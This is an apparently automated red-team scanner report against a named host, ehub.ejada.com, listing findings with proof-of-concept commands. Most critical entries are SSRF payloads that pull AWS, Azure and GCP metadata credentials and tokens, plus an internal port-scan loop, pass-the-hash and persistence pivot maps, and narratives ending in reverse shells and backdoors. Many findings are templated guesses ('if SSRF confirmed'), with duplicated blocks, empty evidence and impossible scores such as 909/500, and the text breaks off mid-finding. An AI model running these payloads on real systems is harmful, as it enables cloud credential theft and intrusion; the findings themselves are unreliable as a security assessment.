# APEX_HUNTER v1.0 — Red Team Report: ehub.ejada.com
**Generated:** 2026-06-01 02:30:47  
**Target:** ehub.ejada.com  
**Scan folder:** `ehub.ejada.com_20260601_020947`

---

## Executive Summary

|Severity|Count|
|-|-|
|CRITICAL|21|
|HIGH|31|
|MEDIUM|41|
|LOW|0|
|INFO|20|

---

## ehub.ejada.com

### Infrastructure
- IP: 34.111.193.103 (Unknown)
- TLS: TLSv1.3 / TLS_AES_256_GCM_SHA384
- Cert:  (expires )
- WAF/CDN: None detected
- Technologies: None
- Header Score: 0/100
- Subdomains: 4 | JS files: 0 | Secrets: 0

### Findings

#### [CRITICAL] FULL-CHAIN-POC: Full chain PoC — 5 findings chained, 2 attack combos identified
**CWE:** CWE-1035 | **CVSS:** 10.0 | **Category:** Exploit Chain

Top-5 findings exploit chain for ehub.ejada.com:
Step 1: [HIGH] Critical Security Headers Missing
  PoC: curl -sI 'https://ehub.ejada.com/'
Step 2: [MEDIUM] Clickjacking Vulnerability
  PoC: curl -sI 'https://ehub.ejada.com/' | grep -i 'x-frame\|frame-ancestors'
Step 3: [MEDIUM] Dangling DNS — blog.ejada.com does not resolve
  PoC: dig blog.ejada.com +short
Step 4: [MEDIUM] Dangling DNS — help.ejada.com does not resolve
  PoC: dig help.ejada.com +short
Step 5: [MEDIUM] Dangling DNS — support.ejada.com does not resolve
  PoC: dig support.ejada.com +short

Attack combos:
  [CHAIN] SSRF to Cloud Metadata = IAM credential theft (CRITICAL)
  [CHAIN] Subdomain Takeover → CSP bypass → XSS (HIGH)

**Evidence:**
```

```

**PoC:**
```bash
curl -sI 'https://ehub.ejada.com/'
curl -sI 'https://ehub.ejada.com/' | grep -i 'x-frame\|frame-ancestors'
dig blog.ejada.com +short
dig help.ejada.com +short
dig support.ejada.com +short
```

**Fix:** Address CRITICAL and HIGH findings first. Prioritise the chains above as they represent real attack scenarios.

---

#### [CRITICAL] ADV-EXPLOIT-CHAIN: Advanced exploit chain: SSRF → Cloud Metadata → IAM Key Exfiltration → Full AWS Takeover
**CWE:** CWE-1035 | **CVSS:** 10.0 | **Category:** Exploit Chain

Attack chains synthesised for ehub.ejada.com (2 chains, 49 findings):

[CRITICAL] SSRF → Cloud Metadata → IAM Key Exfiltration → Full AWS Takeover
  Narrative: 1. SSRF fetches http://169.254.169.254/  2. IAM role credentials returned  3. aws configure + enumerate S3/EC2/Lambda  4. Lateral movement to production infra

[CRITICAL] SSTI Expression Evaluation → OS Command Execution → Server Takeover
  Narrative: 1. Inject {{7*7}} → 49  2. Escalate to Jinja2 class traversal payload  3. os.popen('id')  4. Reverse shell

**Evidence:**
```

```

**PoC:**
```bash
Step 1: curl -sI 'https://ehub.ejada.com/'
curl -sI 'https://ehub.ejada.com/' | grep -i 'x-frame\|frame-ance
Step 2: curl -sI 'https://ehub.ejada.com/'
Step 3: curl -sI 'https://ehub.ejada.com/' | grep -i 'x-frame\|frame-ancestors'
Step 4: dig blog.ejada.com +short
Step 5: dig help.ejada.com +short
```

**Fix:** Remediate CRITICAL findings first — especially any chain anchor (SSRF, SSTI, Deserialisation, LFI). Each individual fix breaks the chain.

---

#### [CRITICAL] AZURE-IMDS-V1-METADATA-URL: SSRF → Azure IMDS v1-metadata Chain via ?url
**CWE:** CWE-918 | **CVSS:** 9.9 | **Category:** SSRF → Cloud Pivot

If SSRF confirmed via ?url, inject Azure IMDS endpoint (v1-metadata) to retrieve managed identity access token granting full Azure control plane access (subscription, Key Vault, Storage).

**Evidence:**
```
SSRF URL: https://ehub.ejada.com?url=http%3A//169.254.169.254/metadata/instance%3Fapi-version%3D2021-02-01
IMDS Target: http://169.254.169.254/metadata/instance?api-version=2021-02-01
Expected response: {"access_token": "eyJ0eXAiOiJKV1QiLCJhbGci..."}
```

**PoC:**
```bash
# Step 1 — Verify SSRF via OOB:
curl -sk 'https://ehub.ejada.com?url=http://YOUR_OOB_DOMAIN.burpcollaborator.net/'
# Step 2 — Exploit via Azure IMDS:
curl -sk 'https://ehub.ejada.com?url=http%3A//169.254.169.254/metadata/instance%3Fapi-version%3D2021-02-01' -H 'Metadata: true'
```

**Fix:** Block IMDS at network layer (SSRF egress filtering). Use IMDSv2 with PUT token. Apply outbound firewall rules blocking 169.254.169.254.

---

#### [CRITICAL] AZURE-IMDS-V1-IDENTITY-URL: SSRF → Azure IMDS v1-identity Chain via ?url
**CWE:** CWE-918 | **CVSS:** 9.9 | **Category:** SSRF → Cloud Pivot

If SSRF confirmed via ?url, inject Azure IMDS endpoint (v1-identity) to retrieve managed identity access token granting full Azure control plane access (subscription, Key Vault, Storage).

**Evidence:**
```
SSRF URL: https://ehub.ejada.com?url=http%3A//169.254.169.254/metadata/identity/oauth2/token%3Fapi-version%3D2018-02-01%26resource%3Dhttps%3A//management.azure.com/
IMDS Target: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
Expected response: {"access_token": "eyJ0eXAiOiJKV1QiLCJhbGci..."}
```

**PoC:**
```bash
# Step 1 — Verify SSRF via OOB:
curl -sk 'https://ehub.ejada.com?url=http://YOUR_OOB_DOMAIN.burpcollaborator.net/'
# Step 2 — Exploit via Azure IMDS:
curl -sk 'https://ehub.ejada.com?url=http%3A//169.254.169.254/metadata/identity/oauth2/token%3Fapi-version%3D2018-02-01%26resource%3Dhttps%3A//management.azure.com/' -H 'Metadata: true'
```

**Fix:** Block IMDS at network layer (SSRF egress filtering). Use IMDSv2 with PUT token. Apply outbound firewall rules blocking 169.254.169.254.

---

#### [CRITICAL] AZURE-IMDS-V1-SUBSCRIPTIO-URL: SSRF → Azure IMDS v1-subscription Chain via ?url
**CWE:** CWE-918 | **CVSS:** 9.9 | **Category:** SSRF → Cloud Pivot

If SSRF confirmed via ?url, inject Azure IMDS endpoint (v1-subscription) to retrieve managed identity access token granting full Azure control plane access (subscription, Key Vault, Storage).

**Evidence:**
```
SSRF URL: https://ehub.ejada.com?url=http%3A//169.254.169.254/metadata/instance/compute/subscriptionId%3Fapi-version%3D2021-02-01%26format%3Dtext
IMDS Target: http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text
Expected response: {"access_token": "eyJ0eXAiOiJKV1QiLCJhbGci..."}
```

**PoC:**
```bash
# Step 1 — Verify SSRF via OOB:
curl -sk 'https://ehub.ejada.com?url=http://YOUR_OOB_DOMAIN.burpcollaborator.net/'
# Step 2 — Exploit via Azure IMDS:
curl -sk 'https://ehub.ejada.com?url=http%3A//169.254.169.254/metadata/instance/compute/subscriptionId%3Fapi-version%3D2021-02-01%26format%3Dtext' -H 'Metadata: true'
```

**Fix:** Block IMDS at network layer (SSRF egress filtering). Use IMDSv2 with PUT token. Apply outbound firewall rules blocking 169.254.169.254.

---

#### [CRITICAL] AZURE-IMDS-V2-IDENTITY-URL: SSRF → Azure IMDS v2-identity Chain via ?url
**CWE:** CWE-918 | **CVSS:** 9.9 | **Category:** SSRF → Cloud Pivot

If SSRF confirmed via ?url, inject Azure IMDS endpoint (v2-identity) to retrieve managed identity access token granting full Azure control plane access (subscription, Key Vault, Storage).

**Evidence:**
```
SSRF URL: https://ehub.ejada.com?url=http%3A//169.254.169.254/metadata/identity/oauth2/token%3Fapi-version%3D2019-11-01%26resource%3Dhttps%3A//vault.azure.net
IMDS Target: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-11-01&resource=https://vault.azure.net
Expected response: {"access_token": "eyJ0eXAiOiJKV1QiLCJhbGci..."}
```

**PoC:**
```bash
# Step 1 — Verify SSRF via OOB:
curl -sk 'https://ehub.ejada.com?url=http://YOUR_OOB_DOMAIN.burpcollaborator.net/'
# Step 2 — Exploit via Azure IMDS:
curl -sk 'https://ehub.ejada.com?url=http%3A//169.254.169.254/metadata/identity/oauth2/token%3Fapi-version%3D2019-11-01%26resource%3Dhttps%3A//vault.azure.net' -H 'Metadata: true'
```

**Fix:** Block IMDS at network layer (SSRF egress filtering). Use IMDSv2 with PUT token. Apply outbound firewall rules blocking 169.254.169.254.

---

#### [CRITICAL] AWS-IMDS-V1-CREDS: SSRF → AWS IMDS v1-creds — IAM Credential Theft Chain
**CWE:** CWE-918 | **CVSS:** 9.9 | **Category:** SSRF → Cloud Pivot

If SSRF confirmed, inject AWS IMDS endpoint (v1-creds) to retrieve IAM role credentials (AccessKeyId, SecretAccessKey, Token) granting full AWS API access. Combine with IMDSv2 X-aws-ec2-metadata-token bypass.

**Evidence:**
```
Target: http://169.254.169.254/latest/meta-data/iam/security-credentials/
Step 1 — Get role name: http://169.254.169.254/latest/meta-data/iam/security-credentials/
Step 2 — Get creds: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
Step 3 — Use creds: aws sts get-caller-identity --profile stolen
```

**PoC:**
```bash
# IMDSv1 (no token required):
curl -sk 'https://ehub.ejada.com?url=http%3A//169.254.169.254/latest/meta-data/iam/security-credentials/'
# IMDSv2 bypass (PUT token first):
TOKEN=$(curl -sk -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' 'http://169.254.169.254/latest/api/token') && curl -sk -H "X-aws-ec2-metadata-token: $TOKEN" 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
```

**Fix:** Block 169.254.169.254 in egress firewall rules. Enforce IMDSv2 (require token). Apply least-privilege IAM roles. Use VPC endpoint policies.

---

#### [CRITICAL] AWS-IMDS-V1-ROLE: SSRF → AWS IMDS v1-role — IAM Credential Theft Chain
**CWE:** CWE-918 | **CVSS:** 9.9 | **Category:** SSRF → Cloud Pivot

If SSRF confirmed, inject AWS IMDS endpoint (v1-role) to retrieve IAM role credentials (AccessKeyId, SecretAccessKey, Token) granting full AWS API access. Combine with IMDSv2 X-aws-ec2-metadata-token bypass.

**Evidence:**
```
Target: http://169.254.169.254/latest/meta-data/iam/info
Step 1 — Get role name: http://169.254.169.254/latest/meta-data/iam/security-credentials/
Step 2 — Get creds: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
Step 3 — Use creds: aws sts get-caller-identity --profile stolen
```

**PoC:**
```bash
# IMDSv1 (no token required):
curl -sk 'https://ehub.ejada.com?url=http%3A//169.254.169.254/latest/meta-data/iam/info'
# IMDSv2 bypass (PUT token first):
TOKEN=$(curl -sk -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' 'http://169.254.169.254/latest/api/token') && curl -sk -H "X-aws-ec2-metadata-token: $TOKEN" 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
```

**Fix:** Block 169.254.169.254 in egress firewall rules. Enforce IMDSv2 (require token). Apply least-privilege IAM roles. Use VPC endpoint policies.

---

#### [CRITICAL] AWS-IMDS-V2-TOKEN: SSRF → AWS IMDS v2-token — IAM Credential Theft Chain
**CWE:** CWE-918 | **CVSS:** 9.9 | **Category:** SSRF → Cloud Pivot

If SSRF confirmed, inject AWS IMDS endpoint (v2-token) to retrieve IAM role credentials (AccessKeyId, SecretAccessKey, Token) granting full AWS API access. Combine with IMDSv2 X-aws-ec2-metadata-token bypass.

**Evidence:**
```
Target: http://169.254.169.254/latest/api/token
Step 1 — Get role name: http://169.254.169.254/latest/meta-data/iam/security-credentials/
Step 2 — Get creds: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
Step 3 — Use creds: aws sts get-caller-identity --profile stolen
```

**PoC:**
```bash
# IMDSv1 (no token required):
curl -sk 'https://ehub.ejada.com?url=http%3A//169.254.169.254/latest/api/token'
# IMDSv2 bypass (PUT token first):
TOKEN=$(curl -sk -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' 'http://169.254.169.254/latest/api/token') && curl -sk -H "X-aws-ec2-metadata-token: $TOKEN" 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
```

**Fix:** Block 169.254.169.254 in egress firewall rules. Enforce IMDSv2 (require token). Apply least-privilege IAM roles. Use VPC endpoint policies.

---

#### [CRITICAL] GCP-META-SA-TOKEN: SSRF → GCP Metadata sa-token — Service Account Token Chain
**CWE:** CWE-918 | **CVSS:** 9.9 | **Category:** SSRF → Cloud Pivot

If SSRF confirmed, inject GCP metadata endpoint (sa-token) to retrieve OAuth2 access_token for the instance service account. Token grants GCP API access to Cloud Storage, GKE, BigQuery, etc.

**Evidence:**
```
Metadata Target: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Required header: Metadata-Flavor: Google
Expected: {"access_token": "ya29.xxx", "token_type": "Bearer"}
```

**PoC:**
```bash
curl -sk 'https://ehub.ejada.com?url=http%3A//metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'
# Or direct if host has SSRF:
curl -sk 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'
```

**Fix:** Block metadata.google.internal and 169.254.169.254 in egress. Use Workload Identity Federation instead of service account keys. Apply metadata server access controls.

---

#### [CRITICAL] GCP-META-SA-EMAIL: SSRF → GCP Metadata sa-email — Service Account Token Chain
**CWE:** CWE-918 | **CVSS:** 9.9 | **Category:** SSRF → Cloud Pivot

If SSRF confirmed, inject GCP metadata endpoint (sa-email) to retrieve OAuth2 access_token for the instance service account. Token grants GCP API access to Cloud Storage, GKE, BigQuery, etc.

**Evidence:**
```
Metadata Target: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
Required header: Metadata-Flavor: Google
Expected: {"access_token": "ya29.xxx", "token_type": "Bearer"}
```

**PoC:**
```bash
curl -sk 'https://ehub.ejada.com?url=http%3A//metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email' -H 'Metadata-Flavor: Google'
# Or direct if host has SSRF:
curl -sk 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email' -H 'Metadata-Flavor: Google'
```

**Fix:** Block metadata.google.internal and 169.254.169.254 in egress. Use Workload Identity Federation instead of service account keys. Apply metadata server access controls.

---

#### [CRITICAL] GCP-META-PROJECT-ID: SSRF → GCP Metadata project-id — Service Account Token Chain
**CWE:** CWE-918 | **CVSS:** 9.9 | **Category:** SSRF → Cloud Pivot

If SSRF confirmed, inject GCP metadata endpoint (project-id) to retrieve OAuth2 access_token for the instance service account. Token grants GCP API access to Cloud Storage, GKE, BigQuery, etc.

**Evidence:**
```
Metadata Target: http://metadata.google.internal/computeMetadata/v1/project/project-id
Required header: Metadata-Flavor: Google
Expected: {"access_token": "ya29.xxx", "token_type": "Bearer"}
```

**PoC:**
```bash
curl -sk 'https://ehub.ejada.com?url=http%3A//metadata.google.internal/computeMetadata/v1/project/project-id' -H 'Metadata-Flavor: Google'
# Or direct if host has SSRF:
curl -sk 'http://metadata.google.internal/computeMetadata/v1/project/project-id' -H 'Metadata-Flavor: Google'
```

**Fix:** Block metadata.google.internal and 169.254.169.254 in egress. Use Workload Identity Federation instead of service account keys. Apply metadata server access controls.

---

#### [CRITICAL] CHAIN-CLOUD-TAKEOVER: [EXPLOIT CHAIN] Cloud Account Takeover via SSRF
**CWE:** CWE-693 | **CVSS:** 9.9 | **Category:** Exploit Chain

[APPLICABLE TO THIS TARGET] Complete exploit narrative: Cloud Account Takeover via SSRF

Attack steps:
1. Identify SSRF-capable parameter via OOB DNS callback
2. Pivot to cloud IMDS (169.254.169.254 or metadata.google.internal)
3. Extract managed identity / IAM role credentials
4. Authenticate to cloud API (aws sts, az account, gcloud auth)
5. Enumerate IAM permissions, storage buckets, secrets
6. Exfiltrate data, escalate to admin, deploy backdoor Lambda/Function

Impact: Full cloud account compromise, data exfiltration, persistence

**Evidence:**
```
Applicable to target: True | CVSS: 9.9
```

**PoC:**
```bash
# See attack steps above — each step must be verified manually
```

**Fix:** Address all prerequisite vulnerabilities. Implement defence-in-depth: WAF, egress filtering, least privilege, network segmentation, SIEM alerting.

---

#### [CRITICAL] SCORECARD-001: Attack Surface Scorecard — Risk Score 539/500 (100%) — CRITICAL
**CWE:** CWE-693 | **CVSS:** 0.0 | **Category:** Risk Scorecard

Attack Surface Scorecard — ehub.ejada.com
══════════════════════════════════════════════════
Risk Score    : 539 / 500 (100%)
Risk Band     : CRITICAL — Immediate remediation required

Finding Distribution:
  CRITICAL   :   13 █████████████
  HIGH       :    5 █████
  MEDIUM     :   41 ████████████████████████████████████████
  LOW        :    0 
  INFO       :    9 █████████

Top Attack Categories:
  Information Disclosure                   : 26
  SSRF → Cloud Pivot                       : 10
  Subdomain Takeover                       : 7
  Exploit Chain                            : 7
  GraphQL                                  : 4
  SSRF                                     : 3
  RCE                                      : 2
  Security Headers                         : 1
  Clickjacking                             : 1
  VDP                                      : 1

Remediation Priority Matrix:
  Priority 1 (Immediate): All CRITICAL findings
  Priority 2 (7 days):    All HIGH findings
  Priority 3 (30 days):   All MEDIUM findings
  Priority 4 (90 days):   All LOW findings

**Evidence:**
```
Total findings: 68 | Weighted score: 539/500
```

**PoC:**
```bash
# This is a summary scorecard — see individual findings for PoC commands
```

**Fix:** Use this scorecard to prioritise remediation. Share with development team and security leadership. Re-scan after fixes to verify remediation effectiveness.

---

#### [CRITICAL] SCORECARD-001: Attack Surface Scorecard — Risk Score 564/500 (100%) — CRITICAL
**CWE:** CWE-693 | **CVSS:** 0.0 | **Category:** Risk Scorecard

Attack Surface Scorecard — ehub.ejada.com
══════════════════════════════════════════════════
Risk Score    : 564 / 500 (100%)
Risk Band     : CRITICAL — Immediate remediation required

Finding Distribution:
  CRITICAL   :   14 ██████████████
  HIGH       :    5 █████
  MEDIUM     :   41 ████████████████████████████████████████
  LOW        :    0 
  INFO       :   14 ██████████████

Top Attack Categories:
  Information Disclosure                   : 26
  SSRF → Cloud Pivot                       : 10
  Subdomain Takeover                       : 7
  Exploit Chain                            : 7
  GraphQL                                  : 4
  SSRF                                     : 3
  Log4Shell / Java RCE                     : 3
  RCE                                      : 2
  DNS Exfiltration                         : 2
  Security Headers                         : 1

Remediation Priority Matrix:
  Priority 1 (Immediate): All CRITICAL findings
  Priority 2 (7 days):    All HIGH findings
  Priority 3 (30 days):   All MEDIUM findings
  Priority 4 (90 days):   All LOW findings

**Evidence:**
```
Total findings: 74 | Weighted score: 564/500
```

**PoC:**
```bash
# This is a summary scorecard — see individual findings for PoC commands
```

**Fix:** Use this scorecard to prioritise remediation. Share with development team and security leadership. Re-scan after fixes to verify remediation effectiveness.

---

#### [CRITICAL] LATERAL-MOVE-MAP-001: Lateral Movement Attack Path Map
**CWE:** CWE-284 | **CVSS:** 0.0 | **Category:** Lateral Movement

Lateral movement paths from ehub.ejada.com to adjacent systems. Network segment: 34.111.193.0/24. Internal scan pivots once initial RCE/SSRF is confirmed.

**Evidence:**
```
Target IP: 34.111.193.103
Network: 34.111.193.0/24

Pivot Paths:
  → SSH             ports [22] : Stolen SSH key / password spraying
  → RDP             ports [3389, 3390] : Pass-the-hash via NTLM, credential reuse
  → SMB             ports [445, 139] : Pass-the-hash, lateral tool execution
  → WinRM           ports [5985, 5986] : Invoke-Command / Evil-WinRM with stolen creds
  → MySQL           ports [3306] : Credential reuse from leaked .env/config
  → PostgreSQL      ports [5432] : Credential reuse, COPY TO PROGRAM RCE
  → Redis           ports [6379] : CONFIG SET + SLAVEOF persistence
  → MongoDB         ports [27017, 27018] : Unauthenticated access + data exfil
  → Elasticsearch   ports [9200, 9300] : Unauthenticated index dump
  → Kafka           ports [9092, 9093] : Topic enumeration + message injection
  → RabbitMQ        ports [5672, 15672] : Default credentials + queue poisoning
  → Kubernetes      ports [6443, 8443] : Service account token → pod exec
  → Docker          ports [2375, 2376] : Daemon API → privileged container escape
  → Consul          ports [8500, 8501] : Service mesh → KV store secrets
  → etcd            ports [2379, 2380] : K8s secrets dump
```

**PoC:**
```bash
# Internal port scan via SSRF (interactsh):
for port in 22 80 443 3306 5432 6379 8080 8443 9200; do
  curl -sk 'https://ehub.ejada.com/?url=http://10.0.0.1:$port/' 2>&1 |   grep -v 'refused\|timed' && echo "OPEN: $port"
done
```

**Fix:** Implement network segmentation. Use jump hosts for internal access. Apply micro-segmentation. Monitor east-west traffic. Rotate all credentials that may have been exposed.

---

#### [CRITICAL] LATERAL-MOVE-MAP-001: Lateral Movement Attack Path Map
**CWE:** CWE-284 | **CVSS:** 0.0 | **Category:** Lateral Movement

Lateral movement paths from ehub.ejada.com to adjacent systems. Network segment: 34.111.193.0/24. Internal scan pivots once initial RCE/SSRF is confirmed.

**Evidence:**
```
Target IP: 34.111.193.103
Network: 34.111.193.0/24

Pivot Paths:
  → SSH             ports [22] : Stolen SSH key / password spraying
  → RDP             ports [3389, 3390] : Pass-the-hash via NTLM, credential reuse
  → SMB             ports [445, 139] : Pass-the-hash, lateral tool execution
  → WinRM           ports [5985, 5986] : Invoke-Command / Evil-WinRM with stolen creds
  → MySQL           ports [3306] : Credential reuse from leaked .env/config
  → PostgreSQL      ports [5432] : Credential reuse, COPY TO PROGRAM RCE
  → Redis           ports [6379] : CONFIG SET + SLAVEOF persistence
  → MongoDB         ports [27017, 27018] : Unauthenticated access + data exfil
  → Elasticsearch   ports [9200, 9300] : Unauthenticated index dump
  → Kafka           ports [9092, 9093] : Topic enumeration + message injection
  → RabbitMQ        ports [5672, 15672] : Default credentials + queue poisoning
  → Kubernetes      ports [6443, 8443] : Service account token → pod exec
  → Docker          ports [2375, 2376] : Daemon API → privileged container escape
  → Consul          ports [8500, 8501] : Service mesh → KV store secrets
  → etcd            ports [2379, 2380] : K8s secrets dump
```

**PoC:**
```bash
# Internal port scan via SSRF (interactsh):
for port in 22 80 443 3306 5432 6379 8080 8443 9200; do
  curl -sk 'https://ehub.ejada.com/?url=http://10.0.0.1:$port/' 2>&1 |   grep -v 'refused\|timed' && echo "OPEN: $port"
done
```

**Fix:** Implement network segmentation. Use jump hosts for internal access. Apply micro-segmentation. Monitor east-west traffic. Rotate all credentials that may have been exposed.

---

#### [CRITICAL] LATERAL-MOVE-MAP-001: Lateral Movement Attack Path Map
**CWE:** CWE-284 | **CVSS:** 0.0 | **Category:** Lateral Movement

Lateral movement paths from ehub.ejada.com to adjacent systems. Network segment: 34.111.193.0/24. Internal scan pivots once initial RCE/SSRF is confirmed.

**Evidence:**
```
Target IP: 34.111.193.103
Network: 34.111.193.0/24

Pivot Paths:
  → SSH             ports [22] : Stolen SSH key / password spraying
  → RDP             ports [3389, 3390] : Pass-the-hash via NTLM, credential reuse
  → SMB             ports [445, 139] : Pass-the-hash, lateral tool execution
  → WinRM           ports [5985, 5986] : Invoke-Command / Evil-WinRM with stolen creds
  → MySQL           ports [3306] : Credential reuse from leaked .env/config
  → PostgreSQL      ports [5432] : Credential reuse, COPY TO PROGRAM RCE
  → Redis           ports [6379] : CONFIG SET + SLAVEOF persistence
  → MongoDB         ports [27017, 27018] : Unauthenticated access + data exfil
  → Elasticsearch   ports [9200, 9300] : Unauthenticated index dump
  → Kafka           ports [9092, 9093] : Topic enumeration + message injection
  → RabbitMQ        ports [5672, 15672] : Default credentials + queue poisoning
  → Kubernetes      ports [6443, 8443] : Service account token → pod exec
  → Docker          ports [2375, 2376] : Daemon API → privileged container escape
  → Consul          ports [8500, 8501] : Service mesh → KV store secrets
  → etcd            ports [2379, 2380] : K8s secrets dump
```

**PoC:**
```bash
# Internal port scan via SSRF (interactsh):
for port in 22 80 443 3306 5432 6379 8080 8443 9200; do
  curl -sk 'https://ehub.ejada.com/?url=http://10.0.0.1:$port/' 2>&1 |   grep -v 'refused\|timed' && echo "OPEN: $port"
done
```

**Fix:** Implement network segmentation. Use jump hosts for internal access. Apply micro-segmentation. Monitor east-west traffic. Rotate all credentials that may have been exposed.

---

#### [CRITICAL] LATERAL-MOVE-MAP-001: Lateral Movement Attack Path Map
**CWE:** CWE-284 | **CVSS:** 0.0 | **Category:** Lateral Movement

Lateral movement paths from ehub.ejada.com to adjacent systems. Network segment: 34.111.193.0/24. Internal scan pivots once initial RCE/SSRF is confirmed.

**Evidence:**
```
Target IP: 34.111.193.103
Network: 34.111.193.0/24

Pivot Paths:
  → SSH             ports [22] : Stolen SSH key / password spraying
  → RDP             ports [3389, 3390] : Pass-the-hash via NTLM, credential reuse
  → SMB             ports [445, 139] : Pass-the-hash, lateral tool execution
  → WinRM           ports [5985, 5986] : Invoke-Command / Evil-WinRM with stolen creds
  → MySQL           ports [3306] : Credential reuse from leaked .env/config
  → PostgreSQL      ports [5432] : Credential reuse, COPY TO PROGRAM RCE
  → Redis           ports [6379] : CONFIG SET + SLAVEOF persistence
  → MongoDB         ports [27017, 27018] : Unauthenticated access + data exfil
  → Elasticsearch   ports [9200, 9300] : Unauthenticated index dump
  → Kafka           ports [9092, 9093] : Topic enumeration + message injection
  → RabbitMQ        ports [5672, 15672] : Default credentials + queue poisoning
  → Kubernetes      ports [6443, 8443] : Service account token → pod exec
  → Docker          ports [2375, 2376] : Daemon API → privileged container escape
  → Consul          ports [8500, 8501] : Service mesh → KV store secrets
  → etcd            ports [2379, 2380] : K8s secrets dump
```

**PoC:**
```bash
# Internal port scan via SSRF (interactsh):
for port in 22 80 443 3306 5432 6379 8080 8443 9200; do
  curl -sk 'https://ehub.ejada.com/?url=http://10.0.0.1:$port/' 2>&1 |   grep -v 'refused\|timed' && echo "OPEN: $port"
done
```

**Fix:** Implement network segmentation. Use jump hosts for internal access. Apply micro-segmentation. Monitor east-west traffic. Rotate all credentials that may have been exposed.

---

#### [CRITICAL] SCORECARD-001: Attack Surface Scorecard — Risk Score 909/500 (100%) — CRITICAL
**CWE:** CWE-693 | **CVSS:** 0.0 | **Category:** Risk Scorecard

Attack Surface Scorecard — ehub.ejada.com
══════════════════════════════════════════════════
Risk Score    : 909 / 500 (100%)
Risk Band     : CRITICAL — Immediate remediation required

Finding Distribution:
  CRITICAL   :   19 ███████████████████
  HIGH       :   27 ███████████████████████████
  MEDIUM     :   41 ████████████████████████████████████████
  LOW        :    0 
  INFO       :   18 ██████████████████

Top Attack Categories:
  Information Disclosure                   : 26
  Auth / Credential Stuffing               : 22
  SSRF → Cloud Pivot                       : 10
  SSRF                                     : 7
  Subdomain Takeover                       : 7
  Exploit Chain                            : 7
  GraphQL                                  : 4
  Lateral Movement                         : 4
  Log4Shell / Java RCE                     : 3
  RCE                                      : 2

Remediation Priority Matrix:
  Priority 1 (Immediate): All CRITICAL findings
  Priority 2 (7 days):    All HIGH findings
  Priority 3 (30 days):   All MEDIUM findings
  Priority 4 (90 days):   All LOW findings

**Evidence:**
```
Total findings: 105 | Weighted score: 909/500
```

**PoC:**
```bash
# This is a summary scorecard — see individual findings for PoC commands
```

**Fix:** Use this scorecard to prioritise remediation. Share with development team and security leadership. Re-scan after fixes to verify remediation effectiveness.

---

#### [CRITICAL] CLOUD-META-PIVOT-CHAIN-001: Cloud Metadata Pivot Chain — Built from 17 SSRF finding(s)
**CWE:** CWE-918 | **CVSS:** 9.9 | **Category:** SSRF → Cloud Pivot

Complete cloud metadata pivot chains generated from 17 confirmed/suspected SSRF finding(s). Each chain shows exact steps from SSRF to full cloud account takeover.

**Evidence:**
```
SSRF source: F-BSSRF-001 — Blind SSRF Attack Surface — OOB Payloads Generated
SSRF source: SSRF-META-PROBE — Cloud metadata SSRF payloads generated (manual verification 
SSRF source: SSRF-BYPASS-POC — SSRF URL parser bypass payloads generated — manual verificat

[AWS Pivot Chain]
  1. http://169.254.169.254/latest/meta-data/iam/security-credentials/
  2. Extract role name from response
  3. http://169.254.169.254/latest/meta-data/iam/security-credentials/{ROLE}
  4. Extract AccessKeyId, SecretAccessKey, Token
  5. Configure: aws configure --profile stolen
  6. Enumerate: aws sts get-caller-identity; aws s3 ls; aws ec2 describe-instances
  7. Escalate: aws iam list-attached-user-policies; iam:CreateAccessKey

[Azure Pivot Chain]
  1. http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/ -H 'Metadata: true'
  2. Extract access_token (JWT bearer)
  3. GET https://management.azure.com/subscriptions?api-version=2020-01-01 -H 'Authorization: Bearer {token}'
  4. List resources: /subscriptions/{id}/resources
  5. Access Key Vault: https://vault.azure.net/secrets
  6. Escalate: assign Owner role via ARM API

[GCP Pivot Chain]
  1. http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H 'Metadata-Flavor: Google'
  2. Extract access_token
  3. https://cloudresourcemanager.googleapis.com/v1/projects -H 'Authorization: Bearer {token}'
  4. List buckets: https://storage.googleapis.com/storage/v1/b?project={project}
  5. Access secrets: https://secretmanager.googleapis.com/v1/projects/{proj}/secrets
  6. Escalate: iam.setIamPolicy on project

```

**PoC:**
```bash
# See chain steps above — replace SSRF parameter with metadata URLs
```

**Fix:** Block all cloud IMDS IPs at egress layer. Enforce IMDSv2 (AWS). Restrict service account permissions. Apply Workload Identity (GCP). Use managed identity with least privilege (Azure).

---

#### [HIGH] F-HDR-001: Critical Security Headers Missing
**CWE:** CWE-693 | **CVSS:** 5.4 | **Category:** Security Headers

Header score 0/100 — multiple critical headers absent.

**Evidence:**
```
{
  "strict-transport-security": "MISSING",
  "content-security-policy": "MISSING",
  "x-content-type-options": "MISSING",
  "x-frame-options": "MISSING",
  "referrer-policy": "MISSING",
  "permissions-policy": "MISSING",
  "x-xss-protection": "MISSING",
  "cache-control": "MISSING",
  "cross-origin-opener-policy": "MISSING",
  "cross-origin-resource-policy": "MISSING"
}
```

**PoC:**
```bash
curl -sI 'https://ehub.ejada.com/'
```

**Fix:** Implement HSTS, CSP, X-Frame-Options, X-Content-Type-Options.

---

#### [HIGH] CHAIN-JENKINS-RCE: [EXPLOIT CHAIN] Jenkins Groovy RCE → Lateral Movement
**CWE:** CWE-693 | **CVSS:** 10.0 | **Category:** Exploit Chain

[THEORETICAL — VERIFY PREREQUISITES] Complete exploit narrative: Jenkins Groovy RCE → Lateral Movement

Attack steps:
